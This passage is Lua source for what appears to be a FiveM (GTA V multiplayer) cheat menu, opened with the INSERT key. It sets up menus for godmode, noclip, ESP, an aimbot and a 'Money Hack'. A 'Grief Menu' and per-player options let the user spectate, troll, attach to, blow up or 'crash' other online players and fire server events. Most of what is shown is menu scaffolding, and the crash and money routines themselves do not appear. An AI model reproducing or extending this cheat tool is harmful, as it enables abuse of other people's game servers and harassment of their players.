		takytemamrad.CreateSubMenu("localsedans", "LocalVehicleSpawner", "Sedans")
		takytemamrad.CreateSubMenu("localsuvs", "LocalVehicleSpawner", "SUVs")
		takytemamrad.CreateSubMenu("localcoupes", "LocalVehicleSpawner", "Coupes")
		takytemamrad.CreateSubMenu("localmuscle", "LocalVehicleSpawner", "Muscle")
		takytemamrad.CreateSubMenu("localsportsclassics", "LocalVehicleSpawner", "Sports Classics")
		takytemamrad.CreateSubMenu("localsports", "LocalVehicleSpawner", "Sports")
		takytemamrad.CreateSubMenu("localsuper", "LocalVehicleSpawner", "Super")
		takytemamrad.CreateSubMenu("localmotorcycles", "LocalVehicleSpawner", "Motorcycles")
		takytemamrad.CreateSubMenu("localoffroad", "LocalVehicleSpawner", "Off-Road")
		takytemamrad.CreateSubMenu("localindustrial", "LocalVehicleSpawner", "Industrial")
		takytemamrad.CreateSubMenu("localutility", "LocalVehicleSpawner", "Utility")
		takytemamrad.CreateSubMenu("localvans", "LocalVehicleSpawner", "Vans")
		takytemamrad.CreateSubMenu("localcycles", "LocalVehicleSpawner", "Cycles")
		takytemamrad.CreateSubMenu("localboats", "LocalVehicleSpawner", "Boats")
		takytemamrad.CreateSubMenu("localhelicopters", "LocalVehicleSpawner", "Helicopters")
		takytemamrad.CreateSubMenu("localplanes", "LocalVehicleSpawner", "Planes")
		takytemamrad.CreateSubMenu("localservice", "LocalVehicleSpawner", "Service")
		takytemamrad.CreateSubMenu("localcommercial", "LocalVehicleSpawner", "Commercial")

		-- MENU NASTAVENI
		takytemamrad.CreateSubMenu("MenuSettingsColor", "MenuSettings", "Change Menu Color")
		takytemamrad.CreateSubMenu("MenuSettingsCredits", "MenuSettings", "Credits")

		-- Online Hraci
		takytemamrad.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayersMenu', 'Player Options')

		-- ONLINE PLAYERS > PLAYER > WEAPON OPTIONS MENU
		takytemamrad.CreateSubMenu('OnlineTeleportMenu', 'PlayerOptionsMenu', 'Teleport Options')
		takytemamrad.CreateSubMenu('OnlineWepMenu', 'PlayerOptionsMenu', 'Weapon Menu')
		takytemamrad.CreateSubMenu('OnlineWepCategory', 'OnlineWepMenu', 'Give Weapon')
		takytemamrad.CreateSubMenu("OnlineMeleeWeapons", "OnlineWepCategory", "Melee")
		takytemamrad.CreateSubMenu("OnlineSidearmWeapons", "OnlineWepCategory", "Handguns")
		takytemamrad.CreateSubMenu("OnlineAutorifleWeapons", "OnlineWepCategory", "Assault Rifles")
		takytemamrad.CreateSubMenu("OnlineShotgunWeapons", "OnlineWepCategory", "Shotguns")
		takytemamrad.CreateSubMenu("OnlineTrollMenu", "PlayerOptionsMenu", "Troll Options")
		takytemamrad.CreateSubMenu("OnlineAttachMenu", "PlayerOptionsMenu", "Attach Options")
		takytemamrad.CreateSubMenu('OnlineCrashMenu', 'PlayerOptionsMenu', 'Crash Options')
		
		takytemamrad.CreateSubMenu('OnlineVehicleMenuPlayer', 'PlayerOptionsMenu', "Vehicle Options")
		takytemamrad.CreateSubMenu('ESXMenuPlayer', 'PlayerOptionsMenu', "ESX Options")		
		
	-- Visual PLAYERS MENU
		takytemamrad.CreateSubMenu("ESP Settings", "VisualMenu", "ESP Settings")
		takytemamrad.CreateSubMenu("Crosshairs Settings", "VisualMenu", "Crosshairs Settings")
		takytemamrad.CreateSubMenu("Misc Settings", "VisualMenu", "Misc Settings")
		takytemamrad.CreateSubMenu("Weather Settings", "VisualMenu", "Weather Settings")

		-- MENU WEAPON
		takytemamrad.CreateSubMenu("LocalWepCategory", "LocalWepMenu", "Give Weapon")
		takytemamrad.CreateSubMenu("LocalWepAimbot", "LocalWepMenu", "Weapon Aimbot")
		takytemamrad.CreateSubMenu("LocalWepCustomer", "LocalWepMenu", "Custom Weapon")
		takytemamrad.CreateSubMenu("LocalWepSkin", "LocalWepMenu", "Skin Weapon")
		takytemamrad.CreateSubMenu("LocalMeleeWeapons", "LocalWepCategory", "Melee")
		takytemamrad.CreateSubMenu("LocalSidearmWeapons", "LocalWepCategory", "Handguns")
		takytemamrad.CreateSubMenu("LocalSmgWeapons", "LocalWepCategory", "Submachine Guns")
		takytemamrad.CreateSubMenu("LocalShotgunWeapons", "LocalWepCategory", "Shotguns")
		takytemamrad.CreateSubMenu("LocalAssaultRifleWeapons", "LocalWepCategory", "Assault Rifles")
		takytemamrad.CreateSubMenu("LocalMachineGunWeapons", "LocalWepCategory", "Light Machine Guns")
		takytemamrad.CreateSubMenu("LocalSniperRifles", "LocalWepCategory", "Sniper Rifles")
		takytemamrad.CreateSubMenu("LocalHeavyWeapons", "LocalWepCategory", "Heavy Weapons")
		-- MENU SERVER
		takytemamrad.CreateSubMenu("MenuMoney", "ServerMenu", "Money Hack")

		for i, mod in pairs(LSC.vehicleMods) do
			takytemamrad.CreateSubMenu(mod.meta, 'lsc_bodywork', mod.name)
		end

		-- GRIEF
		takytemamrad.CreateSubMenu("MenuFun", "GriefMenu", "Fun/Troll Menu")
		takytemamrad.CreateSubMenu("MenuHack", "GriefMenu", "Destroy/Hack")
		takytemamrad.CreateSubMenu("MenuAttach", "GriefMenu", "Attach/Menu")
		takytemamrad.CreateSubMenu("MenuExplosion", "GriefMenu", "Explosions Menu")
		takytemamrad.CreateSubMenu("ExplosionList", "GriefMenu", "Explosions List")
		local SelectedPlayer = nil
	end

	while isMenuEnabled do
		Cya.Player.Vehicle = GetVehiclePedIsUsing(PlayerPedId())

		if IsDisabledControlJustPressed(0, Cya.Keys["INSERT"]) then
			GateKeep()
			MenuOpen = true
			BLOWMYDICK("takytemamradMainMenu")
		end

		if takytemamrad.IsMenuOpened("takytemamradMainMenu") then
			if takytemamrad.MenuButton('<font color="#66666A">Self Options', "SelfMenu") then end
			if takytemamrad.MenuButton('<font color="#66666A">Online Options', "OnlinePlayersMenu") then end
			if takytemamrad.MenuButton('<font color="#66666A">Visual Options', "VisualMenu") then end
			if Rage then
				if takytemamrad.MenuButton('<font color="#66666A">Teleport Options', "TeleportMenu") then end
			end
			if takytemamrad.MenuButton('<font color="#66666A">Vehicle Options', "LocalVehicleMenu") then end
			if takytemamrad.MenuButton('<font color="#66666A">Weapon Options', "LocalWepMenu") then end
			if Rage then
				if takytemamrad.MenuButton('<font color="#66666A">Grief Menu', "GriefMenu") then end 
				
			end
			if takytemamrad.MenuButton('<font color="#66666A">Server Options', "ServerMenu") then end
			if takytemamrad.MenuButton('<font color="#66666A">Menu Settings', "MenuSettings") then end

			takytemamrad.Display()

		elseif takytemamrad.IsMenuOpened("SelfMenu") then
			if takytemamrad.MenuButton('<font color="#66666A">Super Powers', "SelfSuperPowers") then end
			if takytemamrad.MenuButton('<font color="#66666A">Player Options', "SelfPlayerOptions") then end

			if takytemamrad.CheckBox('<font color="#66666A">Infinite Stamina', InfStamina, function(enabled) InfStamina = enabled end) then end

			if takytemamrad.Button('<font color="#66666A">Revive Self', '<font color="#4280C6">Native') then
				local Math = {}
				function respawnPed(ped, coords, heading)
					SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false, true)
					NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
					SetPlayerInvincible(ped, false)
					TriggerCustomEvent(false, 'playerSpawned', coords.x, coords.y, coords.z)
					ClearPedBloodDamage(ped)
				end
				function Math.Round(value, numDecimalPlaces)
					if numDecimalPlaces then
						local power = 10^numDecimalPlaces
						return math.floor((value * power) + 0.5) / (power)
					else
						return math.floor(value + 0.5)
					end
				end
				local coords = GetEntityCoords(PlayerPedId())
				local formattedCoords = {
					x = Math.Round(coords.x, 1),
					y = Math.Round(coords.y, 1),
					z = Math.Round(coords.z, 1)
				}
				respawnPed(PlayerPedId(), formattedCoords, 0.0)
				StopScreenEffect('DeathFailOut')
				for i = 1, #Cya.Events.Revive do
					TriggerEvent(Cya.Events.Revive[i])
				end
			end
			if takytemamrad.CheckBox('<font color="#66666A">Ragdoll', Cya.Toggle.SelfRagdoll) then SelfRagdoll() end

			if takytemamrad.CheckBox('<font color="#66666A">Anti-Ragdoll', RagdollToggle, function(enabled) RagdollToggle = enabled end) then end
			if takytemamrad.Button('<font color="#66666A">Die in style', '<font color="#4280C6">Native') then KillYourself() end

			if Rage then
				if takytemamrad.Slider('<font color="#66666A">Move speed', SliderOptions.FastRun.Words, SliderOptions.FastRun.Selected, function(selectedIndex)
					if SliderOptions.FastRun.Selected ~= selectedIndex then 
						SliderOptions.FastRun.Selected = selectedIndex
					end
				end) then end

				if takytemamrad.CheckBox('<font color="#66666A">Noclip', Cya.Player.isNoclipping, function(enabled) 
					Cya.Player.isNoclipping = enabled 
					if Cya.Player.isNoclipping then
						SetEntityVisible(PlayerPedId(), false, false)
					else
						SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
						SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
						SetEntityVisible(PlayerPedId(), true, false)
					end
				end) then end
			end

			takytemamrad.Display()

		elseif takytemamrad.IsMenuOpened("SelfSuperPowers") then
			if takytemamrad.CheckBox('<font color="#66666A">Godmode', Godmode, function(enabled) Godmode = enabled end) then

			end

			if takytemamrad.CheckBox('<font color="#66666A">Flash Mode', FlashMode, function(enabled) FlashMode = enabled end) then

			end

			if takytemamrad.CheckBox('<font color="#66666A">Super Jump', SuperJump, function(enabled) SuperJump = enabled end) then

			end

			if takytemamrad.CheckBox('<font color="#66666A">Invisibility', Invisible, function(enabled) Invisible = enabled end) then

			end

			if takytemamrad.Button('<font color="#66666A">Magneto', '<font color="#4280C6">NOT FINISHED') then
			--if takytemamrad.CheckBox('<font color="#66666A">Magneto', Cya.Toggle.MagnetoMode) then
				takytemamrad.SendNotification({text = string.format("Magneto Mode is not finished", modelName), type = 'error'})
				--MagnetoMode()
			end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("SelfPlayerOptions") then
			if takytemamrad.Button('<font color="#66666A">Max Health', '<font color="#4280C6">Native') then SetEntityHealth(PlayerPedId(), 200) end
			if takytemamrad.Button('<font color="#66666A">Max Armor', '<font color="#4280C6">Native') then	SetPedArmour(PlayerPedId(), 100) end
			if takytemamrad.Button('<font color="#66666A">Remove Armor', '<font color="#4280C6">Native') then SetPedArmour(PlayerPedId(), 0) end
			if takytemamrad.Button('<font color="#66666A">Clean Ped', '<font color="#4280C6">Native') then 	takytemamrad.CleanPed() end
			if takytemamrad.Button('<font color="#66666A">Cancel Animation', '<font color="#4280C6">Native') then ClearPedTasksImmediately(PlayerPedId()) end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlinePlayersMenu") then
			onlinePlayerSelected = {}
			
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				onlinePlayerSelected[i] = id -- equivalent to table.insert(table, value) but faster

				if takytemamrad.MenuButton(("~b~%-4d <font color='#66666A'>%s</font>"):format(GetPlayerServerId(id), GetPlayerName(id)), 'PlayerOptionsMenu') then
					SelectedPlayer = id
				end
			end

			local index = menus[currentMenu].currentOption

			takytemamrad.DrawPlayerInfo(onlinePlayerSelected[index])
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("PlayerOptionsMenu") then

			takytemamrad.SetSubTitle("PlayerOptionsMenu", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")

			if takytemamrad.Button('<font color="#66666A">Spectate Player', (Cya.Player.Spectating and '<font color="#4280C6">[SPECTATING]')) then
				CreateThreadNow(function()
					SpectatePlayer(SelectedPlayer)
				end)
			end

			if takytemamrad.Button("<font color='#66666A'>Clone Outfit</font>", "<font color='#4280C6'>Native</font>") then clonePedOutfit(PlayerPedId(), GetPlayerPed(SelectedPlayer)) end
			if takytemamrad.Button("<font color='#66666A'>Clone Car</font>", "<font color='#4280C6'>Native</font>") then clonePlayerVehicle(SelectedPlayer) end

--------------------------------------------------------------------------------------------------------------------

			if takytemamrad.MenuButton('<font color="#66666A">Teleport Options', "OnlineTeleportMenu") then end
			if takytemamrad.MenuButton('<font color="#66666A">Weapon Option', "OnlineWepMenu") then end
			if takytemamrad.MenuButton('<font color="#66666A">Vehicle Options', "OnlineVehicleMenuPlayer") then end
			if takytemamrad.MenuButton('<font color="#66666A">Triggers Options', "ESXMenuPlayer") then end
			if takytemamrad.MenuButton('<font color="#66666A">Troll Options', "OnlineTrollMenu") then end
			if takytemamrad.MenuButton('<font color="#66666A">Attach Options', "OnlineAttachMenu") then end
			if takytemamrad.MenuButton('<font color="#66666A">Crash Options', "OnlineCrashMenu") then end
			takytemamrad.DrawPlayerInfo(SelectedPlayer)
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("VisualMenu") then

			if takytemamrad.MenuButton('<font color="#66666A">ESP Settings', "ESP Settings") then end
			if takytemamrad.MenuButton('<font color="#66666A">Crosshairs Settings', "Crosshairs Settings") then end
			if takytemamrad.MenuButton('<font color="#66666A">Misc Settings', "Misc Settings") then end
			if takytemamrad.MenuButton('<font color="#66666A">Weather Settings', "Weather Settings") then end
			if takytemamrad.Button('<font color="#66666A">Optimize FPS', '<font color="#4280C6">Native') then 
				takytemamrad.SendNotification({text = "Open System Log: Starting", type = "info"})
				takytemamrad.OptimizerPrint()
				takytemamrad.MoreFPS()
			end
			takytemamrad.Display()
	elseif takytemamrad.IsMenuOpened("ESP Settings") then		
		if takytemamrad.CheckBox('<font color="#66666A">Lines', Line_ESP) then
			Line_ESP = not Line_ESP
		end
		if takytemamrad.CheckBox('<font color="#66666A">Boxes', Box_ESP) then
			Box_ESP = not Box_ESP
		end

		if takytemamrad.CheckBox('<font color="#66666A">Glow', Glow_ESP, function(enabled) Glow_ESP = enabled end) then

		end

		--[[if takytemamrad.CheckBox('<font color="#66666A">Full Info', Info_ESP) then
			Info_ESP= not Info_ESP
		end]]
		--if takytemamrad.CheckBox('<font color="#66666A">ESP', showNametags, function(enabled) showNametags = enabled end) then end
		--if takytemamrad.CheckBox('<font color="#66666A">Simple ESP', showNametags2, function(enabled) showNametags2 = enabled end) then end
		if takytemamrad.CheckBox('<font color="#66666A">Extra Sensory Perception', Nametagy, function(enabled) Nametagy = enabled end) then end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("Crosshairs Settings") then
			if takytemamrad.CheckBox('<font color="#66666A">Original Crosshair', Crosshair, function(enabled) Crosshair = enabled end) then end
			if takytemamrad.CheckBox('<font color="#66666A">CS:GO Crosshair', Crosshair1, function(enabled) Crosshair1 = enabled end) then end
			takytemamrad.Display()

		elseif takytemamrad.IsMenuOpened("Misc Settings") then
			if takytemamrad.CheckBox('<font color="#66666A">Force Minimap', showMinimap, function(enabled) showMinimap = enabled end) then end
			if takytemamrad.CheckBox('<font color="#66666A">Force Player Blips', playerBlips, function(enabled) playerBlips = enabled end) then end
			if takytemamrad.CheckBox('<font color="#66666A">Force Third Person', ForceThirdPerson, function(enabled)ForceThirdPerson = enabled end) then end
			if takytemamrad.CheckBox('<font color="#66666A">Show Invisible Players', Cya.Player.RevealInvisibles, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "reveal_invis_players") then
				Cya.Player.RevealInvisibles = not Cya.Player.RevealInvisibles
			end

			if takytemamrad.Button('<font color="#66666A">Show FPS') then
				takytemamrad.BuduSeToDelatMRDKO()
			end
			takytemamrad.Display()
	elseif takytemamrad.IsMenuOpened("Weather Settings") then
		if takytemamrad.CheckBox('<font color="#66666A">Reset Weather', ResetWeather) then
			ResetWeather = not ResetWeather
		end
		if takytemamrad.CheckBox('<font color="#66666A">Force Snow', ChciSnih, function(enabled) ChciSnih = enabled end) then end
		if takytemamrad.CheckBox('<font color="#66666A">Christmas Weather', XMAS) then
			XMAS = not XMAS
		end
		if takytemamrad.CheckBox('<font color="#66666A">Blizzard Weather', BLIZZARD) then
			BLIZZARD = not BLIZZARD
		end
		if takytemamrad.CheckBox('<font color="#66666A">Foggy Weather', FOGGY) then
			FOGGY = not FOGGY
		end
		if takytemamrad.CheckBox('<font color="#66666A">Extra Sunny Weather', EXTRASUNNY) then
			EXTRASUNNY = not EXTRASUNNY
		end
		if takytemamrad.CheckBox('<font color="#66666A">Clear Skyes Weather', CLEAR) then
			CLEAR = not CLEAR
		end
		if takytemamrad.CheckBox('<font color="#66666A">Thunder Weather', THUNDER) then
			THUNDER = not THUNDER
		end


		--if takytemamrad.CheckBox('<font color="#66666A">Show FPS', ShowMyFPS, function(enabled)ShowMyFPS = enabled end) then end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("TeleportMenu") then
			if takytemamrad.Button('<font color="#66666A">Teleport to Waypoint', '<font color="#4280C6">Native') then TeleportToWaypoint() end			
			if takytemamrad.CheckBox('<font color="#66666A">Show coords', ShowCoords) then
				ShowCoords = not ShowCoords
			end
			if takytemamrad.MenuButton('<font color="#66666A">Clothes Store', "ClothingStores") then
		elseif takytemamrad.MenuButton('<font color="#66666A">Barbery Shops', "BarberShops") then
		elseif takytemamrad.MenuButton('<font color="#66666A">Airports', "Airports") then
		elseif takytemamrad.MenuButton('<font color="#66666A">Garages', "Garages") then
		elseif takytemamrad.MenuButton('<font color="#66666A">Ammu-Nation', "Ammunation") then
		elseif takytemamrad.MenuButton('<font color="#66666A">Cinemas', "Cinemas") then
		elseif takytemamrad.MenuButton('<font color="#66666A">Clubs', "Clubs") then	
		end
		takytemamrad.Display()
	elseif takytemamrad.IsMenuOpened("ClothingStores") then
		if takytemamrad.Button("<font color='#66666A'>Paleto Bay</font>", '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-4.5, 6521.2, 30.5)
		elseif takytemamrad.Button("<font color='#66666A'>Zancudo</font>", '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(1678.05, 4819.88, 41.29)
		elseif takytemamrad.Button("<font color='#66666A'>Sandy Shores</font>", '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(1179.67, 2691.37, 15.4)
		elseif takytemamrad.Button("<font color='#66666A'>Strawberry</font>", '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(89.320786, -1392.317627, 30.4)
		elseif takytemamrad.Button("<font color='#66666A'>Great Chaparral</font>", '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-1089.4, 2697.03, 19.44)
		elseif takytemamrad.Button("<font color='#66666A'>Havick</font>", '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(134.122055, -200.21133, 53.86409)
		elseif takytemamrad.Button("<font color='#66666A'>Del Perro</font>", '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-1210.620361, -784.16021, 16.549015)
		elseif takytemamrad.Button("<font color='#66666A'>Burton</font>", '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-148.234741, -308.07, 38.104)
		elseif takytemamrad.Button("<font color='#66666A'>Rockford Hills</font>", '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-725.551453, -162.83371, 36.57)
		elseif takytemamrad.Button("<font color='#66666A'>MorningWood</font>", '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-1460.654, -227.55, 48.72)
		end
		takytemamrad.Display()
	elseif takytemamrad.IsMenuOpened("BarberShops") then
		if takytemamrad.Button('<font color="#66666A">Havick', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-27.79, -136.86, 56.51)
		elseif takytemamrad.Button('<font color="#66666A">Rockford Hills', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-829.42, -191.58, 36.92)
		elseif takytemamrad.Button('<font color="#66666A">Vespucci', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-1294.99, -1117.64, 6.15)
		elseif takytemamrad.Button('<font color="#66666A">Mirror Park', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(1198.02, -471.81, 65.67)
		elseif takytemamrad.Button('<font color="#66666A">Davis', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(127.76, -1718.65, 28.65)
		elseif takytemamrad.Button('<font color="#66666A">Paleto Bay', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-286.63, 6239.38, 30.56)
		elseif takytemamrad.Button('<font color="#66666A">Sandy Shores', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(1938.35, 3717.8, 31.6)
		end
		takytemamrad.Display()
	elseif takytemamrad.IsMenuOpened("Airports") then
		if takytemamrad.Button('<font color="#66666A">Los Santos Airport', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-1070.9, -2972.122, 13.77)
		elseif takytemamrad.Button('<font color="#66666A">Flight School', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-1142, -2697.3, 13.77)
		elseif takytemamrad.Button('<font color="#66666A">Sandy Shores', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(1682.19, 3279.98, 40.6)
		elseif takytemamrad.Button('<font color="#66666A">McKenzie Airfield', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(2124.62, 4805.27, 40.47)
		end
		takytemamrad.Display()
	elseif takytemamrad.IsMenuOpened("Garages") then
		if takytemamrad.Button('<font color="#66666A">Mort Mutual Insurance', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-221.74, -1158.24, 23.04)
		elseif takytemamrad.Button('<font color="#66666A">Bennys Garage', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-196.34, -1303.1, 30.65)
		elseif takytemamrad.Button('<font color="#66666A">Beekers Garage', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(116.22, 6606.2, 31.46)
		elseif takytemamrad.Button('<font color="#66666A">Sandy Shores', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(1176.82, 2657.97, 37.37)
		elseif takytemamrad.Button('<font color="#66666A">Grand Senora Dust', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(1173.45, 2661.58, 37.28)
		elseif takytemamrad.Button('<font color="#66666A">Burton', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-370.53, -130.4, 38.19)
		elseif takytemamrad.Button('<font color="#66666A">Little Seoul Car Wash', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-701.82, -921.92, 18.58)
		end
		takytemamrad.Display()
	elseif takytemamrad.IsMenuOpened("Ammunation") then
		if takytemamrad.Button('<font color="#66666A">Paleto Bay', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-318.85, 6074.43, 30.614)
		elseif takytemamrad.Button('<font color="#66666A">Sandy Shores', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(1704.67, 3748.88, 33.28)
		elseif takytemamrad.Button('<font color="#66666A">Great Chaparral', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-1108.6, 2685.69, 18.17)
		elseif takytemamrad.Button('<font color="#66666A">Chumash', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-1108.6, 2685.69, 18.17)
		elseif takytemamrad.Button('<font color="#66666A">Palomino Fwy', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(2571.371, 313.879, 107.97)
		elseif takytemamrad.Button('<font color="#66666A">Hawick', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(235.66, -42.26, 69.22)
		elseif takytemamrad.Button('<font color="#66666A">Morningwood', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-1328.592896, -387.11441, 36.126881)
		elseif takytemamrad.Button('<font color="#66666A">Little Seoul', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-665.232727, -952.522522, 20.866556)
		elseif takytemamrad.Button('<font color="#66666A">La Mesa', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(844.439026, -1009.422424, 27.511728)
		elseif takytemamrad.Button('<font color="#66666A">Pillbox Hill', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(17.37779, -1122.183105, 28.469843)
		elseif takytemamrad.Button('<font color="#66666A">Cypress Flats', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(814.442017, -2130.448486, 28.867798)
		end
		takytemamrad.Display()
	elseif takytemamrad.IsMenuOpened("Cinemas") then
		if takytemamrad.Button('<font color="#66666A">Vinewood', '<font color="#4280C6">Native') then
			local AGr861BFU9PBNmP = GetPlayerPed(-1)
			TeleportToInputtedCoords(300.407776, 193.05107, 103.590019)
		elseif takytemamrad.Button('<font color="#66666A">Ten Cent', '<font color="#4280C6">Native') then
			local fQyezsZ = GetPlayerPed(-1)
			TeleportToInputtedCoords(401.796816, -713.924988, 28.56971)
		elseif takytemamrad.Button('<font color="#66666A">Morningwood', '<font color="#4280C6">Native') then
			TeleportToInputtedCoords(-1410.07, -199.047531, 46.5025)
		end
		takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("Clubs") then
			if takytemamrad.Button('<font color="#66666A">Vanilla Unicorn', '<font color="#4280C6">Native') then
				TeleportToInputtedCoords(135.5, -1308.3, 28.3)
		end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalVehicleMenu") then
			if takytemamrad.MenuButton('<font color="#66666A">Vehicle Spawner', "LocalVehicleSpawner") then end

			if takytemamrad.ComboBox('<font color="#66666A">Vehicle Actions', ComboOptions.VehicleActions.Words, ComboOptions.VehicleActions.Selected, function(selectedIndex)
				if ComboOptions.VehicleActions.Selected ~= selectedIndex then
					ComboOptions.VehicleActions.Selected = selectedIndex
				end
			end) then 
				ComboOptions.VehicleActions.Values[ComboOptions.VehicleActions.Selected](Cya.Player.Vehicle)
			end

			if takytemamrad.MenuButton('<font color="#66666A">Modify Vehicle', "LSC") then end

			if takytemamrad.CheckBox('<font color="#66666A">Easy Handling', Cya.Toggle.EasyHandling) then
				Cya.Toggle.EasyHandling = not Cya.Toggle.EasyHandling
			end

			if takytemamrad.CheckBox('<font color="#66666A">No Fall', Cya.Toggle.VehicleNoFall) then
				Cya.Toggle.VehicleNoFall = not Cya.Toggle.VehicleNoFall
			end

			if takytemamrad.CheckBox('<font color="#66666A">No Collision', Cya.Toggle.VehicleCollision, function(enabled) 
				Cya.Toggle.VehicleCollision = enabled
			end) then end

			if takytemamrad.ComboBox('<font color="#66666A">Vehicle Hygiene', ComboOptions.DirtLevel.Words, ComboOptions.DirtLevel.Selected(Cya.Player.Vehicle), function(selectedIndex)
				if ComboOptions.DirtLevel.Selected(Cya.Player.Vehicle) ~= ComboOptions.DirtLevel.Values[selectedIndex] then
					SetVehicleDirtLevel(Cya.Player.Vehicle, ComboOptions.DirtLevel.Values[selectedIndex])
				end
			end) then end
			if takytemamrad.Button('<font color="#66666A">Remote Car', '<font color="#4280C6">Native') then
            RCCAR123 = KeyboardInput('<font color="#4280C6">Enter Car Name', "", 1000000)
			    if RCCAR123 and IsModelValid(RCCAR123) and IsModelAVehicle(RCCAR123) then
			        RCCar.Start()
				else
					takytemamrad.SendNotification({text = string.format("%s is not a valid vehicle", RCCAR123), type = 'error'})
                end
            end 

			if takytemamrad.Button('<font color="#66666A">Change License Plate', '<font color="#4280C6">Native') then
				ChangeVehiclePlateText(Cya.Player.Vehicle)
			end

			if takytemamrad.CheckBox('<font color="#66666A">Rainbow Vehicle Color', Cya.Toggle.RainbowVehicle, RainbowVehicle) then 
			end

			if takytemamrad.CheckBox('<font color="#66666A">Vehicle Godmode', VehGod,
					function(enabled)
						VehGod = enabled
					end) 
				then
			end
			if takytemamrad.CheckBox('<font color="#66666A">Horn Boost', ZatrubSiDevko,
					function(enabled)
						ZatrubSiDevko = enabled
					end)
				then
			end
			if takytemamrad.CheckBox('<font color="#66666A">Horn Boost ULTRA', ZatrubSiDevko2,
					function(enabled)
						ZatrubSiDevko2 = enabled
					end)
				then
			end			

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalVehicleSpawner") then
			if takytemamrad.CheckBox('<font color="#66666A">Spawn Inside', Cya.Toggle.SpawnInVehicle, function(enabled)
				Cya.Toggle.SpawnInVehicle = enabled
			end) then end
			
			if takytemamrad.CheckBox('<font color="#66666A">Replace Current', Cya.Toggle.ReplaceVehicle, function(enabled) 
				Cya.Toggle.ReplaceVehicle = enabled 
			end) then end


			if takytemamrad.Button('<font color="#66666A">Spawn Vehicle by Hash') then
				local modelName = KeyboardInput('<font color="#4280C6">Enter vehicle spawn name', "", 20)
				if not modelName then -- Do nothing in case of accidentel press or change of mind
				elseif IsModelValid(modelName) and IsModelAVehicle(modelName) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				else
					takytemamrad.SendNotification({text = string.format("%s is not a valid vehicle", modelName), type = 'error'})
				end
			end
			if takytemamrad.MenuButton('<font color="#66666A">Compacts', "localcompacts") then end
			if takytemamrad.MenuButton('<font color="#66666A">Sedans', "localsedans") then end
			if takytemamrad.MenuButton('<font color="#66666A">SUVs', "localsuvs") then end
			if takytemamrad.MenuButton('<font color="#66666A">Coupes', 'localcoupes') then end
			if takytemamrad.MenuButton('<font color="#66666A">Muscle', 'localmuscle') then end
			if takytemamrad.MenuButton('<font color="#66666A">Sports Classics', 'localsportsclassics') then end
			if takytemamrad.MenuButton('<font color="#66666A">Sports', 'localsports') then end
			if takytemamrad.MenuButton('<font color="#66666A">Super', 'localsuper') then end
			if takytemamrad.MenuButton('<font color="#66666A">Motorcycles', 'localmotorcycles') then end
			if takytemamrad.MenuButton('<font color="#66666A">Off-Road', 'localoffroad') then end
			if takytemamrad.MenuButton('<font color="#66666A">Industrial', 'localindustrial') then end
			if takytemamrad.MenuButton('<font color="#66666A">Utility', 'localutility') then end
			if takytemamrad.MenuButton('<font color="#66666A">Vans', 'localvans') then end
			if takytemamrad.MenuButton('<font color="#66666A">Cycles', 'localcycles') then end
			if takytemamrad.MenuButton('<font color="#66666A">Boats', 'localboats') then end
			if takytemamrad.MenuButton('<font color="#66666A">Helicopters', 'localhelicopters') then end
			if takytemamrad.MenuButton('<font color="#66666A">Planes', 'localplanes') then end
